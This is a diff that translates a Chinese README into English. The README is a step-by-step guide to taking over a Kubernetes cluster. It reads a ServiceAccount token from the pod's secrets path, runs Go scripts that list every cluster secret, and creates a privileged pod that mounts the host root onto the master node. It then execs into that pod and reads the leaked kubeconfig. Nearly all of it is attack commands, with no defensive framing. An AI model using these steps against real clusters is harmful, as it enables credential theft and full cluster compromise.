@@ -1,26 +1,26 @@
 ### README
 
-1. 获取过度权限ServiceAccount token：
+1. **Get excessive privileges ServiceAccount token:**
 
 ```bash
-# 如果你在pod里
+# If you're in the pod
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
-# 如果你在节点上
-kubectl describe secret <serviceaccount-token> # 将 <serviceaccount-token> 替换为具有过度权限的 ServiceAccount 的 Token 名称
+# If you are on the node
+kubectl describe secret <serviceaccount-token> # Replace <serviceaccount-token> with the Token name of the ServiceAccount with excessive privileges
 ```
 
-2. 结合list secrets 和 create pods权限接管集群例子
+2. **Example of combining `list secret`s and `create pods` permissions to take over the cluster**
 
-你需要先在go代码中补充你想要使用的token和host等信息
+*Note: You need to add the information you want to use in the go code such as token and host first*
 
 ```bash
-# 获取整个集群secrets，得到具有create pods权限的token
+# Get the entire cluster secrets and get a token with create pods privileges.
 go run listSecret.go
-# 使用此token创建挂载根目录的特权容器，并设置污点容忍将它排斥到master节点上，泄漏kubeconfig配置文件
+# Use this token to create a privileged container that mounts the root directory and sets taint tolerance to exclude it from the master node, leaking the kubeconfig configuration file
 go run createPod.go
-# 进入到此特权容器
+# Access to this privileged container
 kubectl exec -it nginx-pod-mount2 -n default -- bash
-# 查看泄露的kubeconfig文件
+# View leaked kubeconfig file
 cat /host/home/ubunt/.kube/config
 ```
 
